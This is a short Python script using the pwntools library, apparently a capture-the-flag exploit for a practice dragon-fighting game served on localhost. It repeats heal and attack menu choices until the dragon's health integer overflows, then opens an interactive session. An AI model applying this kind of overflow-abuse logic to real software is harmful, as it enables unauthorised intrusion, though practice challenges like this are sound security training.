import pwn

RHOST, RPORT = "localhost", 1342

c = pwn.connect(RHOST, RPORT)
#c = pwn.process("./exp-3-1/bin/pwnable")

def heal_self():
    c.recvuntil(b"select a menu option> ")
    c.sendline(b"3\n1")
    c.recvuntil(b" health = ")
    health = int(c.recvline().strip())
    print(f"Player: {health}")
    return health

def heal_dragon(attack_drag=False):
    c.recvuntil(b"select a menu option> ")
    c.sendline(b"2" if attack_drag else b"3\n2")
    c.recvuntil(b" health = ")
    health = int(c.recvline().strip())
    print(f"Dragon: {health}")
    if health < 1:
        raise Exception("oveflowed") 
    return health

player_min, player_max = 100, 150
attack_drag = True
heal_drag = False
drag_prev = 0
try:
    while True:
        if heal_drag: 
            if attack_drag: 
                drag_current_health = heal_dragon(attack_drag=True)
                
                if drag_current_health < 0:
                    break

                if drag_prev == 0:
                    drag_prev = drag_current_health

                elif drag_current_health > drag_prev:
                    attack_drag = False

            if heal_self() <= player_min:
                heal_drag = False
            else:
                heal_dragon()
        else: 
            if heal_self() >= player_max:
                heal_drag = True

except Exception:
    pass

c.interactive()
